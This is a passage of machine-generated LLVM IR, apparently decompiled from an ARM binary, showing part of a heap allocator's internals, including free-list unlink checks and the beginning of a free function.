  %v0_14da8 = phi i32 [ %v3_14d64, %dec_label_pc_14d50 ], [ %v0_14da8.pre, %dec_label_pc_14d94 ]
  %v1_14dbc = phi i32 [ %v2_14d58, %dec_label_pc_14d50 ], [ %v0_14da4.pre, %dec_label_pc_14d94 ]
  %v0_14da0 = load i32, i32* @r4, align 4
  %v1_14da0 = add i32 %v0_14da0, 44
  %v2_14da0 = inttoptr i32 %v1_14da0 to i32*
  %v3_14da0 = load i32, i32* %v2_14da0, align 4
  store i32 %v3_14da0, i32* %r3.global-to-local, align 4
  %v9_14da4 = icmp eq i32 %v1_14dbc, %v3_14da0
  %v1_14da8 = and i32 %v0_14da8, -4
  store i32 %v1_14da8, i32* %r5.global-to-local, align 4
  br i1 %v9_14da4, label %dec_label_pc_14e18, label %dec_label_pc_14db0

dec_label_pc_14db0:                               ; preds = %dec_label_pc_14da0
  %v2_14db0 = add i32 %v1_14dbc, %v1_14da8
  store i32 %v2_14db0, i32* %r3.global-to-local, align 4
  %v1_14db4 = add i32 %v2_14db0, 4
  %v2_14db4 = inttoptr i32 %v1_14db4 to i32*
  %v3_14db4 = load i32, i32* %v2_14db4, align 4
  store i32 %v3_14db4, i32* %r3.global-to-local, align 4
  %v1_14db8 = urem i32 %v3_14db4, 2
  %v2_14db8 = icmp eq i32 %v1_14db8, 0
  %v2_14dbc = add i32 %v1_14dbc, 4
  %v3_14dbc = inttoptr i32 %v2_14dbc to i32*
  store i32 %v1_14da8, i32* %v3_14dbc, align 4
  br i1 %v2_14db8, label %dec_label_pc_14dc4, label %dec_label_pc_14db0.dec_label_pc_14df4_crit_edge

dec_label_pc_14db0.dec_label_pc_14df4_crit_edge:  ; preds = %dec_label_pc_14db0
  %v0_14df8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_14df4

dec_label_pc_14dc4:                               ; preds = %dec_label_pc_14db0
  %v0_14dc4 = load i32, i32* @r0, align 4
  %v1_14dc4 = add i32 %v0_14dc4, 8
  %v2_14dc4 = inttoptr i32 %v1_14dc4 to i32*
  %v3_14dc4 = load i32, i32* %v2_14dc4, align 4
  store i32 %v3_14dc4, i32* %ip.global-to-local, align 4
  %v1_14dc8 = add i32 %v3_14dc4, 12
  %v2_14dc8 = inttoptr i32 %v1_14dc8 to i32*
  %v3_14dc8 = load i32, i32* %v2_14dc8, align 4
  store i32 %v3_14dc8, i32* %r3.global-to-local, align 4
  %v9_14dcc = icmp eq i32 %v3_14dc8, %v0_14dc4
  %v1_14dd0 = add i32 %v0_14dc4, 12
  %v2_14dd0 = inttoptr i32 %v1_14dd0 to i32*
  %v3_14dd0 = load i32, i32* %v2_14dd0, align 4
  store i32 %v3_14dd0, i32* %r2.global-to-local, align 4
  br i1 %v9_14dcc, label %dec_label_pc_14dd8, label %dec_label_pc_14de4

dec_label_pc_14dd8:                               ; preds = %dec_label_pc_14dc4
  %v1_14dd8 = add i32 %v3_14dd0, 8
  %v2_14dd8 = inttoptr i32 %v1_14dd8 to i32*
  %v3_14dd8 = load i32, i32* %v2_14dd8, align 4
  store i32 %v3_14dd8, i32* %r3.global-to-local, align 4
  %v9_14ddc = icmp eq i32 %v3_14dd8, %v0_14dc4
  br i1 %v9_14ddc, label %dec_label_pc_14de8, label %dec_label_pc_14de4

dec_label_pc_14de4:                               ; preds = %dec_label_pc_14dc4, %dec_label_pc_14d88, %dec_label_pc_14d6c, %dec_label_pc_14dd8
  %v0_14de4 = call i32 @abort()
  store i32 %v0_14de4, i32* @r0, align 4
  %v0_14de8.pre = load i32, i32* @ip, align 4
  %v1_14de8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14de8

dec_label_pc_14de8:                               ; preds = %dec_label_pc_14dd8, %dec_label_pc_14de4
  %v1_14de8 = phi i32 [ %v3_14dd0, %dec_label_pc_14dd8 ], [ %v1_14de8.pre, %dec_label_pc_14de4 ]
  %v0_14de8 = phi i32 [ %v3_14dc4, %dec_label_pc_14dd8 ], [ %v0_14de8.pre, %dec_label_pc_14de4 ]
  %v2_14de8 = add i32 %v1_14de8, 8
  %v3_14de8 = inttoptr i32 %v2_14de8 to i32*
  store i32 %v0_14de8, i32* %v3_14de8, align 4
  %v0_14dec = load i32, i32* %r2.global-to-local, align 4
  %v1_14dec = load i32, i32* %ip.global-to-local, align 4
  %v2_14dec = add i32 %v1_14dec, 12
  %v3_14dec = inttoptr i32 %v2_14dec to i32*
  store i32 %v0_14dec, i32* %v3_14dec, align 4
  %v0_14df0 = load i32, i32* %lr.global-to-local, align 4
  %v1_14df0 = load i32, i32* %r5.global-to-local, align 4
  %v2_14df0 = add i32 %v1_14df0, %v0_14df0
  store i32 %v2_14df0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_14df4

dec_label_pc_14df4:                               ; preds = %dec_label_pc_14db0.dec_label_pc_14df4_crit_edge, %dec_label_pc_14de8
  %v0_14df8 = phi i32 [ %v0_14df8.pre, %dec_label_pc_14db0.dec_label_pc_14df4_crit_edge ], [ %v2_14df0, %dec_label_pc_14de8 ]
  %v0_14df4 = load i32, i32* %r7.global-to-local, align 4
  %v1_14df4 = add i32 %v0_14df4, 8
  %v2_14df4 = inttoptr i32 %v1_14df4 to i32*
  %v3_14df4 = load i32, i32* %v2_14df4, align 4
  store i32 %v3_14df4, i32* %r2.global-to-local, align 4
  %v1_14df8 = or i32 %v0_14df8, 1
  store i32 %v1_14df8, i32* %r3.global-to-local, align 4
  %v0_14dfc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14dfc, i32* %v2_14df4, align 4
  %v0_14e00 = load i32, i32* %r1.global-to-local, align 4
  %v1_14e00 = load i32, i32* %r2.global-to-local, align 4
  %v2_14e00 = add i32 %v1_14e00, 12
  %v3_14e00 = inttoptr i32 %v2_14e00 to i32*
  store i32 %v0_14e00, i32* %v3_14e00, align 4
  %v0_14e04 = load i32, i32* %lr.global-to-local, align 4
  %v1_14e04 = load i32, i32* %r1.global-to-local, align 4
  %v3_14e04 = add i32 %v1_14e04, %v0_14e04
  %v4_14e04 = inttoptr i32 %v3_14e04 to i32*
  store i32 %v0_14e04, i32* %v4_14e04, align 4
  %v0_14e08 = load i32, i32* %r3.global-to-local, align 4
  %v1_14e08 = load i32, i32* %r1.global-to-local, align 4
  %v2_14e08 = add i32 %v1_14e08, 4
  %v3_14e08 = inttoptr i32 %v2_14e08 to i32*
  store i32 %v0_14e08, i32* %v3_14e08, align 4
  %v0_14e0c = load i32, i32* %r2.global-to-local, align 4
  %v1_14e0c = load i32, i32* %r1.global-to-local, align 4
  %v2_14e0c = add i32 %v1_14e0c, 8
  %v3_14e0c = inttoptr i32 %v2_14e0c to i32*
  store i32 %v0_14e0c, i32* %v3_14e0c, align 4
  %v0_14e10 = load i32, i32* %r7.global-to-local, align 4
  %v1_14e10 = load i32, i32* %r1.global-to-local, align 4
  %v2_14e10 = add i32 %v1_14e10, 12
  %v3_14e10 = inttoptr i32 %v2_14e10 to i32*
  store i32 %v0_14e10, i32* %v3_14e10, align 4
  br label %dec_label_pc_14e28

dec_label_pc_14e18:                               ; preds = %dec_label_pc_14da0
  %v2_14e18 = add i32 %v1_14da8, %v0_14e18
  %v1_14e1c = or i32 %v2_14e18, 1
  store i32 %v1_14e1c, i32* %r3.global-to-local, align 4
  %v1_14e20 = load i32, i32* %r1.global-to-local, align 4
  %v2_14e20 = add i32 %v1_14e20, 4
  %v3_14e20 = inttoptr i32 %v2_14e20 to i32*
  store i32 %v1_14e1c, i32* %v3_14e20, align 4
  %v0_14e24 = load i32, i32* %r1.global-to-local, align 4
  %v1_14e24 = load i32, i32* @r4, align 4
  %v2_14e24 = add i32 %v1_14e24, 44
  %v3_14e24 = inttoptr i32 %v2_14e24 to i32*
  store i32 %v0_14e24, i32* %v3_14e24, align 4
  br label %dec_label_pc_14e28

dec_label_pc_14e28:                               ; preds = %dec_label_pc_14df4, %dec_label_pc_14e18
  %v0_14e28 = load i32, i32* %sl.global-to-local, align 4
  %v2_14e28 = icmp eq i32 %v0_14e28, 0
  store i32 %v0_14e28, i32* %r1.global-to-local, align 4
  br i1 %v2_14e28, label %dec_label_pc_14e34.loopexit, label %dec_label_pc_14d50

dec_label_pc_14e34.loopexit:                      ; preds = %dec_label_pc_14e28
  %v0_14e34.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_14e34.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_14e34

dec_label_pc_14e34:                               ; preds = %dec_label_pc_14e34.loopexit, %dec_label_pc_14d40
  %v1_14e34 = phi i32 [ %v1_14e34.pre, %dec_label_pc_14e34.loopexit ], [ %v1_14e3410, %dec_label_pc_14d40 ]
  %v0_14e3c = phi i32 [ %v0_14e34.pre, %dec_label_pc_14e34.loopexit ], [ %v1_14d4c, %dec_label_pc_14d40 ]
  %v9_14e34 = icmp eq i32 %v0_14e3c, %v1_14e34
  br i1 %v9_14e34, label %dec_label_pc_14eac, label %dec_label_pc_14e3c

dec_label_pc_14e3c:                               ; preds = %dec_label_pc_14e34
  %v1_14e3c = add i32 %v0_14e3c, 4
  store i32 %v1_14e3c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14d40

dec_label_pc_14e44.dec_label_pc_14e44_crit_edge:  ; preds = %dec_label_pc_14e44.preheader, %dec_label_pc_14e44.dec_label_pc_14e44_crit_edge
  %v0_14e44.pre = load i32, i32* @r4, align 4
  %v1_14e44.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_14e44 = mul i32 %v1_14e44.pre, 8
  %v5_14e44 = add i32 %v4_14e44, %v0_14e44.pre
  %v1_14e48 = add i32 %v1_14e44.pre, 1
  store i32 %v1_14e48, i32* %r2.global-to-local, align 4
  %v1_14e4c = add i32 %v5_14e44, 44
  store i32 %v1_14e4c, i32* %r3.global-to-local, align 4
  %v2_14e54 = add i32 %v5_14e44, 52
  %v3_14e54 = inttoptr i32 %v2_14e54 to i32*
  store i32 %v1_14e4c, i32* %v3_14e54, align 4
  %v0_14e58 = load i32, i32* %r3.global-to-local, align 4
  %v2_14e58 = add i32 %v0_14e58, 12
  %v3_14e58 = inttoptr i32 %v2_14e58 to i32*
  store i32 %v0_14e58, i32* %v3_14e58, align 4
  %v7_14e5c = icmp sgt i32 %v1_14e48, 95
  br i1 %v7_14e5c, label %dec_label_pc_14e60, label %dec_label_pc_14e44.dec_label_pc_14e44_crit_edge

dec_label_pc_14e60:                               ; preds = %dec_label_pc_14e44.dec_label_pc_14e44_crit_edge
  %v0_14e60 = load i32, i32* @r4, align 4
  %v1_14e60 = inttoptr i32 %v0_14e60 to i32*
  %v2_14e60 = load i32, i32* %v1_14e60, align 4
  store i32 %v2_14e60, i32* %r2.global-to-local, align 4
  %v1_14e64 = add i32 %v0_14e60, 864
  %v2_14e64 = inttoptr i32 %v1_14e64 to i32*
  %v3_14e64 = load i32, i32* %v2_14e64, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14e6c = urem i32 %v2_14e60, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_14e74 = or i32 %v3_14e64, 1
  store i32 %v1_14e74, i32* %r1.global-to-local, align 4
  %v1_14e78 = or i32 %v1_14e6c, 72
  store i32 %v1_14e78, i32* %r2.global-to-local, align 4
  %v1_14e7c = add i32 %v0_14e60, 52
  store i32 %v1_14e7c, i32* %ip.global-to-local, align 4
  %v2_14e80 = add i32 %v0_14e60, 840
  %v3_14e80 = inttoptr i32 %v2_14e80 to i32*
  store i32 0, i32* %v3_14e80, align 4
  %v0_14e84 = load i32, i32* %r3.global-to-local, align 4
  %v1_14e84 = add i32 %v0_14e84, 65536
  store i32 %v1_14e84, i32* %r3.global-to-local, align 4
  %v0_14e88 = load i32, i32* %r0.global-to-local, align 4
  %v1_14e88 = load i32, i32* @r4, align 4
  %v2_14e88 = add i32 %v1_14e88, 836
  %v3_14e88 = inttoptr i32 %v2_14e88 to i32*
  store i32 %v0_14e88, i32* %v3_14e88, align 4
  %v0_14e8c = load i32, i32* %r0.global-to-local, align 4
  %v1_14e8c = load i32, i32* @r4, align 4
  %v2_14e8c = add i32 %v1_14e8c, 844
  %v3_14e8c = inttoptr i32 %v2_14e8c to i32*
  store i32 %v0_14e8c, i32* %v3_14e8c, align 4
  %v1_14e90 = load i32, i32* @r4, align 4
  %v2_14e90 = add i32 %v1_14e90, 852
  %v3_14e90 = inttoptr i32 %v2_14e90 to i32*
  store i32 %v1_14e84, i32* %v3_14e90, align 4
  %v1_14e94 = load i32, i32* @r4, align 4
  %v2_14e94 = add i32 %v1_14e94, 864
  %v3_14e94 = inttoptr i32 %v2_14e94 to i32*
  store i32 %v1_14e74, i32* %v3_14e94, align 4
  %v1_14e98 = load i32, i32* @r4, align 4
  %v2_14e98 = inttoptr i32 %v1_14e98 to i32*
  store i32 %v1_14e78, i32* %v2_14e98, align 4
  %v0_14e9c = load i32, i32* %ip.global-to-local, align 4
  %v1_14e9c = load i32, i32* @r4, align 4
  %v2_14e9c = add i32 %v1_14e9c, 44
  %v3_14e9c = inttoptr i32 %v2_14e9c to i32*
  store i32 %v0_14e9c, i32* %v3_14e9c, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_14ea4 = call i32 @sysconf(i32 30, i32 %v1_14e74, i32 %v1_14e78, i32 %v1_14e84)
  store i32 %v4_14ea4, i32* @r0, align 4
  %v1_14ea8 = load i32, i32* @r4, align 4
  %v2_14ea8 = add i32 %v1_14ea8, 860
  %v3_14ea8 = inttoptr i32 %v2_14ea8 to i32*
  store i32 %v4_14ea4, i32* %v3_14ea8, align 4
  br label %dec_label_pc_14eac

dec_label_pc_14eac:                               ; preds = %dec_label_pc_14e34, %dec_label_pc_14e60
  %v2_14eb0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14eb0, i32* @r4, align 4
  %v1_14eb4 = load i32, i32* @r0, align 4
  ret i32 %v1_14eb4

; uselistorder directives
  uselistorder i32 %v0_14e60, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14e58, { 1, 0 }
  uselistorder i32 %v1_14e3c, { 1, 0 }
  uselistorder i32 %v0_14e28, { 0, 2, 1 }
  uselistorder i32 %v0_14e04, { 1, 0 }
  uselistorder i32 %v1_14d54, { 1, 0, 2 }
  uselistorder i32 %v0_14d6c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_14d2c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 17 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 12, 0, 10, 11, 6, 2, 3, 7, 4, 8, 5, 9, 13 }
  uselistorder label %dec_label_pc_14eac, { 1, 0 }
  uselistorder label %dec_label_pc_14e44.dec_label_pc_14e44_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14e28, { 1, 0 }
  uselistorder label %dec_label_pc_14df4, { 1, 0 }
  uselistorder label %dec_label_pc_14de8, { 1, 0 }
  uselistorder label %dec_label_pc_14de4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14da0, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_14eb8 = load i32, i32* @r4, align 4
  %v6_14eb8 = load i32, i32* @r5, align 4
  %v9_14eb8 = load i32, i32* @r6, align 4
  %v12_14eb8 = load i32, i32* @r7, align 4
  %v18_14eb8 = load i32, i32* @lr, align 4
  %v0_14ec0 = load i32, i32* @r0, align 4
  store i32 %v0_14ec0, i32* @r6, align 4
  %v2_14ec0 = icmp eq i32 %v0_14ec0, 0
  %v2_14ec4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* @r7, align 4
  br i1 %v2_14ec0, label %dec_label_pc_150cc, label %dec_label_pc_14ed0

dec_label_pc_14ed0:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_14ed4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 108) to i32*), align 4
  store i32 %v4_14ed4, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_14ed4, i32* %r2.global-to-local, align 4
  %v4_14ee0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 68) to i32*), align 4
  store i32 %v4_14ee0, i32* %r1.global-to-local, align 4
  store i32 %v2_14ec4, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_14eec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 112) to i32*), align 4
  store i32 %v4_14eec, i32* %ip.global-to-local, align 4
  store i32 85752, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14eec)
  %v0_14ef8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14ef8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_14f00 = load i32, i32* @r7, align 4
  %v2_14f00 = add i32 %v0_14f00, 16
  %v3_14f00 = inttoptr i32 %v2_14f00 to i32*
  %v4_14f00 = load i32, i32* %v3_14f00, align 4
  store i32 %v4_14f00, i32* %ip.global-to-local, align 4
  store i32 85772, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14f00)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_14f10 = load i32, i32* @r7, align 4
  %v2_14f10 = add i32 %v0_14f10, 64
  %v3_14f10 = inttoptr i32 %v2_14f10 to i32*
  %v4_14f10 = load i32, i32* %v3_14f10, align 4
  store i32 %v4_14f10, i32* @lr, align 4
  %v0_14f14 = load i32, i32* @r6, align 4
  %v1_14f14 = add i32 %v0_14f14, -4
  %v2_14f14 = inttoptr i32 %v1_14f14 to i32*
  %v3_14f14 = load i32, i32* %v2_14f14, align 4
  store i32 %v3_14f14, i32* %r2.global-to-local, align 4
  %v1_14f18 = inttoptr i32 %v4_14f10 to i32*
  %v2_14f18 = load i32, i32* %v1_14f18, align 4
  store i32 %v2_14f18, i32* %r3.global-to-local, align 4
  %v1_14f1c = and i32 %v3_14f14, -4
  store i32 %v1_14f1c, i32* %ip.global-to-local, align 4
  %v1_14f20 = add i32 %v0_14f14, -8
  store i32 %v1_14f20, i32* @r5, align 4
  store i32 %v1_14f20, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_14f1c, %v2_14f18
  br i1 %tmp, label %dec_label_pc_14f50, label %dec_label_pc_14f30

dec_label_pc_14f30:                               ; preds = %dec_label_pc_14ed0
  %v1_14f30 = or i32 %v2_14f18, 3
  store i32 %v1_14f30, i32* %r3.global-to-local, align 4
  store i32 %v1_14f30, i32* %v1_14f18, align 4
  %v3_14f34 = load i32, i32* @lr, align 4
  %v4_14f34 = add i32 %v3_14f34, -8
  store i32 %v4_14f34, i32* %lr.global-to-local, align 4
  %v0_14f38 = load i32, i32* %ip.global-to-local, align 4
  %v3_14f38 = udiv i32 %v0_14f38, 8
  store i32 %v3_14f38, i32* %r1.global-to-local, align 4
  %v1_14f3c = add i32 %v3_14f34, -4
  store i32 %v1_14f3c, i32* %r2.global-to-local, align 4
  %v4_14f40 = mul nuw i32 %v3_14f38, 4
  %v5_14f40 = add i32 %v4_14f40, %v1_14f3c
  %v6_14f40 = inttoptr i32 %v5_14f40 to i32*
  %v7_14f40 = load i32, i32* %v6_14f40, align 4
  store i32 %v7_14f40, i32* %r3.global-to-local, align 4
  %v1_14f44 = load i32, i32* @r5, align 4
  %v2_14f44 = add i32 %v1_14f44, 8
  %v3_14f44 = inttoptr i32 %v2_14f44 to i32*
  store i32 %v7_14f40, i32* %v3_14f44, align 4
  %v0_14f48 = load i32, i32* @r5, align 4
  %v1_14f48 = load i32, i32* %r2.global-to-local, align 4
  %v2_14f48 = load i32, i32* %r1.global-to-local, align 4
  %v5_14f48 = mul i32 %v2_14f48, 4
  %v6_14f48 = add i32 %v5_14f48, %v1_14f48
  %v7_14f48 = inttoptr i32 %v6_14f48 to i32*
  store i32 %v0_14f48, i32* %v7_14f48, align 4
  br label %dec_label_pc_150b4

dec_label_pc_14f50:                               ; preds = %dec_label_pc_14ed0
  %v1_14f50 = and i32 %v3_14f14, 2
  %v2_14f50 = icmp eq i32 %v1_14f50, 0
  br i1 %v2_14f50, label %dec_label_pc_14f58, label %dec_label_pc_1508c

dec_label_pc_14f58:                               ; preds = %dec_label_pc_14f50
  %v1_14f58 = or i32 %v2_14f18, 1
  store i32 %v1_14f58, i32* %r3.global-to-local, align 4
  store i32 %v1_14f58, i32* %v1_14f18, align 4
  %v0_14f60 = load i32, i32* @r6, align 4
  %v1_14f60 = add i32 %v0_14f60, -4
  %v2_14f60 = inttoptr i32 %v1_14f60 to i32*
  %v3_14f60 = load i32, i32* %v2_14f60, align 4
  store i32 %v3_14f60, i32* %r3.global-to-local, align 4
  %v0_14f64 = load i32, i32* @r5, align 4
  %v1_14f64 = load i32, i32* %ip.global-to-local, align 4
  %v2_14f64 = add i32 %v1_14f64, %v0_14f64
  store i32 %v2_14f64, i32* %lr.global-to-local, align 4
  %v1_14f68 = urem i32 %v3_14f60, 2
  %v2_14f68 = icmp eq i32 %v1_14f68, 0
  %v1_14f6c = add i32 %v2_14f64, 4
  %v2_14f6c = inttoptr i32 %v1_14f6c to i32*
  %v3_14f6c = load i32, i32* %v2_14f6c, align 4
  store i32 %v3_14f6c, i32* %r8.global-to-local, align 4
  br i1 %v2_14f68, label %dec_label_pc_14f74, label %dec_label_pc_14fa8

dec_label_pc_14f74:                               ; preds = %dec_label_pc_14f58
  %v1_14f74 = add i32 %v0_14f60, -8
  %v2_14f74 = inttoptr i32 %v1_14f74 to i32*
  %v3_14f74 = load i32, i32* %v2_14f74, align 4
  store i32 %v3_14f74, i32* %r1.global-to-local, align 4
  %v2_14f78 = sub i32 %v0_14f64, %v3_14f74
  store i32 %v2_14f78, i32* %r3.global-to-local, align 4
  %v1_14f7c = add i32 %v2_14f78, 8
  %v2_14f7c = inttoptr i32 %v1_14f7c to i32*
  %v3_14f7c = load i32, i32* %v2_14f7c, align 4
  store i32 %v3_14f7c, i32* %r2.global-to-local, align 4
  %v1_14f80 = add i32 %v3_14f7c, 12
  %v2_14f80 = inttoptr i32 %v1_14f80 to i32*
  %v3_14f80 = load i32, i32* %v2_14f80, align 4
  store i32 %v3_14f80, i32* %r4.global-to-local, align 4
  %v9_14f84 = icmp eq i32 %v3_14f80, %v2_14f78
  %v1_14f88 = add i32 %v2_14f78, 12
  %v2_14f88 = inttoptr i32 %v1_14f88 to i32*
  %v3_14f88 = load i32, i32* %v2_14f88, align 4
  store i32 %v3_14f88, i32* %r0.global-to-local, align 4
  br i1 %v9_14f84, label %dec_label_pc_14f90, label %dec_label_pc_14ff4

dec_label_pc_14f90:                               ; preds = %dec_label_pc_14f74
  %v1_14f90 = add i32 %v3_14f88, 8
  %v2_14f90 = inttoptr i32 %v1_14f90 to i32*
  %v3_14f90 = load i32, i32* %v2_14f90, align 4
  store i32 %v3_14f90, i32* %r3.global-to-local, align 4
  %v9_14f94 = icmp eq i32 %v3_14f90, %v2_14f78
  br i1 %v9_14f94, label %dec_label_pc_14f9c, label %dec_label_pc_14ff4

dec_label_pc_14f9c:                               ; preds = %dec_label_pc_14f90
  store i32 %v3_14f7c, i32* %v2_14f90, align 4
  %v0_14fa0 = load i32, i32* %r0.global-to-local, align 4
  %v1_14fa0 = load i32, i32* %r2.global-to-local, align 4
  %v2_14fa0 = add i32 %v1_14fa0, 12
  %v3_14fa0 = inttoptr i32 %v2_14fa0 to i32*
  store i32 %v0_14fa0, i32* %v3_14fa0, align 4
  %v0_14fa4 = load i32, i32* %ip.global-to-local, align 4
  %v1_14fa4 = load i32, i32* %r1.global-to-local, align 4
  %v2_14fa4 = add i32 %v1_14fa4, %v0_14fa4
  store i32 %v2_14fa4, i32* %ip.global-to-local, align 4
  %v0_14fb4.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_14fb8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14fa8

dec_label_pc_14fa8:                               ; preds = %dec_label_pc_14f58, %dec_label_pc_14f9c
  %v0_15034 = phi i32 [ %v1_14f64, %dec_label_pc_14f58 ], [ %v2_14fa4, %dec_label_pc_14f9c ]
  %v0_14fb8 = phi i32 [ %v3_14f6c, %dec_label_pc_14f58 ], [ %v0_14fb8.pre, %dec_label_pc_14f9c ]
  %v1_14fcc = phi i32 [ %v2_14f64, %dec_label_pc_14f58 ], [ %v0_14fb4.pre, %dec_label_pc_14f9c ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_14fac = load i32, i32* @r7, align 4
  %v2_14fac = add i32 %v0_14fac, 64
  %v3_14fac = inttoptr i32 %v2_14fac to i32*
  %v4_14fac = load i32, i32* %v3_14fac, align 4
  store i32 %v4_14fac, i32* %r2.global-to-local, align 4
  %v1_14fb0 = add i32 %v4_14fac, 44
  %v2_14fb0 = inttoptr i32 %v1_14fb0 to i32*
  %v3_14fb0 = load i32, i32* %v2_14fb0, align 4
  store i32 %v3_14fb0, i32* %r3.global-to-local, align 4
  %v9_14fb4 = icmp eq i32 %v1_14fcc, %v3_14fb0
  %v1_14fb8 = and i32 %v0_14fb8, -4
  store i32 %v1_14fb8, i32* %r0.global-to-local, align 4
  br i1 %v9_14fb4, label %dec_label_pc_15034, label %dec_label_pc_14fc0

dec_label_pc_14fc0:                               ; preds = %dec_label_pc_14fa8
  %v2_14fc0 = add i32 %v1_14fcc, %v1_14fb8
  store i32 %v2_14fc0, i32* %r3.global-to-local, align 4
  %v1_14fc4 = add i32 %v2_14fc0, 4
  %v2_14fc4 = inttoptr i32 %v1_14fc4 to i32*
  %v3_14fc4 = load i32, i32* %v2_14fc4, align 4
  store i32 %v3_14fc4, i32* %r3.global-to-local, align 4
  %v1_14fc8 = urem i32 %v3_14fc4, 2
  %v2_14fc8 = icmp eq i32 %v1_14fc8, 0
  %v2_14fcc = add i32 %v1_14fcc, 4
  %v3_14fcc = inttoptr i32 %v2_14fcc to i32*
  store i32 %v1_14fb8, i32* %v3_14fcc, align 4
  br i1 %v2_14fc8, label %dec_label_pc_14fd4, label %dec_label_pc_14fc0.dec_label_pc_15004_crit_edge

dec_label_pc_14fc0.dec_label_pc_15004_crit_edge:  ; preds = %dec_label_pc_14fc0
  %v0_15014.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15004

dec_label_pc_14fd4:                               ; preds = %dec_label_pc_14fc0
  %v0_14fd4 = load i32, i32* %lr.global-to-local, align 4
  %v1_14fd4 = add i32 %v0_14fd4, 8
  %v2_14fd4 = inttoptr i32 %v1_14fd4 to i32*
  %v3_14fd4 = load i32, i32* %v2_14fd4, align 4
  store i32 %v3_14fd4, i32* %r1.global-to-local, align 4
  %v1_14fd8 = add i32 %v3_14fd4, 12
  %v2_14fd8 = inttoptr i32 %v1_14fd8 to i32*
  %v3_14fd8 = load i32, i32* %v2_14fd8, align 4
  store i32 %v3_14fd8, i32* %r3.global-to-local, align 4
  %v9_14fdc = icmp eq i32 %v3_14fd8, %v0_14fd4
  %v1_14fe0 = add i32 %v0_14fd4, 12
  %v2_14fe0 = inttoptr i32 %v1_14fe0 to i32*
  %v3_14fe0 = load i32, i32* %v2_14fe0, align 4
  store i32 %v3_14fe0, i32* %r2.global-to-local, align 4
  br i1 %v9_14fdc, label %dec_label_pc_14fe8, label %dec_label_pc_14ff4

dec_label_pc_14fe8:                               ; preds = %dec_label_pc_14fd4
  %v1_14fe8 = add i32 %v3_14fe0, 8
  %v2_14fe8 = inttoptr i32 %v1_14fe8 to i32*
  %v3_14fe8 = load i32, i32* %v2_14fe8, align 4
  store i32 %v3_14fe8, i32* %r3.global-to-local, align 4
  %v9_14fec = icmp eq i32 %v3_14fe8, %v0_14fd4
  br i1 %v9_14fec, label %dec_label_pc_14ff8, label %dec_label_pc_14ff4

dec_label_pc_14ff4:                               ; preds = %dec_label_pc_14fd4, %dec_label_pc_14f90, %dec_label_pc_14f74, %dec_label_pc_14fe8
  %v0_14ff4 = call i32 @abort()
  store i32 %v0_14ff4, i32* %r0.global-to-local, align 4
  %v0_14ff8.pre = load i32, i32* @r1, align 4
  %v1_14ff8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_14ff8

dec_label_pc_14ff8:                               ; preds = %dec_label_pc_14fe8, %dec_label_pc_14ff4
  %v1_14ff8 = phi i32 [ %v3_14fe0, %dec_label_pc_14fe8 ], [ %v1_14ff8.pre, %dec_label_pc_14ff4 ]
  %v0_14ff8 = phi i32 [ %v3_14fd4, %dec_label_pc_14fe8 ], [ %v0_14ff8.pre, %dec_label_pc_14ff4 ]
  %v2_14ff8 = add i32 %v1_14ff8, 8
  %v3_14ff8 = inttoptr i32 %v2_14ff8 to i32*
  store i32 %v0_14ff8, i32* %v3_14ff8, align 4
